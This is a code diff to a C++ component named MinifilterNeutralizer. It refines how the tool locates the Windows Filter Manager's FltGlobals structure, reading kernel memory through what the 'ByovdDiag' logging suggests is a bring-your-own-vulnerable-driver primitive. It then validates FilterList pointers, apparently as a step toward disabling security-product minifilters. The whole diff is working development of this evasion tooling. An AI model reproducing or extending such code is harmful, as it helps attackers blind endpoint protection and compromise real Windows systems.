@@ -3075,15 +3075,29 @@ uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
             // ★ BUILD 461: 验证候选地址 — 读取前 8 字节, 必须是有效内核地址
             uint64_t firstQword = 0;
             if (KernelMemoryAccessor::Instance().ReadKernelVA(candidate, &firstQword, 8)) {
-                // 内核地址范围: 0xFFFF800000000000 ~ 0xFFFFFFFFFFFFFFFF
-                // 排除 ASCII 垃圾/段内偏移 (如 0x656E72656B6E696D)
                 if (firstQword >= 0xFFFF800000000000ULL && firstQword < 0xFFFFFFFFFFFFFFFFULL) {
-                    ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (via %s) verified\n",
-                        (unsigned long long)candidate, exportName);
-                    return candidate;
+                    // ★ BUILD 472: 二级验证 — 读 qword[0] 指向的地址,
+                    //   扫 FilterList 偏移, 必须有 LIST_ENTRY 特征 (Flink/Blink 都是内核地址)
+                    for (uint32_t flOff = 0x100; flOff <= 0x2C0; flOff += 8) {
+                        uint64_t flPair[2] = {};
+                        if (KernelMemoryAccessor::Instance().ReadKernelVA(
+                                firstQword + flOff, flPair, 16)) {
+                            if (flPair[0] >= 0xFFFF800000000000ULL &&
+                                flPair[1] >= 0xFFFF800000000000ULL) {
+                                ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (via %s) struct-verified (flOff=0x%X Flink=0x%llX)\n",
+                                    (unsigned long long)candidate, exportName,
+                                    flOff, (unsigned long long)flPair[0]);
+                                return candidate;
+                            }
+                        }
+                    }
+                    ByovdDiag("FLT:NTRL: %s candidate 0x%llX qword[0]=0x%llX valid ptr but no LIST_ENTRY found\n",
+                        exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
+                    // fall through — try next export
+                } else {
+                    ByovdDiag("FLT:NTRL: %s candidate 0x%llX rejected (qword=0x%016llX not kernel ptr)\n",
+                        exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
                 }
-                ByovdDiag("FLT:NTRL: %s candidate 0x%llX rejected (qword=0x%016llX not kernel ptr)\n",
-                    exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
             }
         } else {
             ByovdDiag("FLT:NTRL: %s found but no .data LEA/MOV ref\n", exportName);
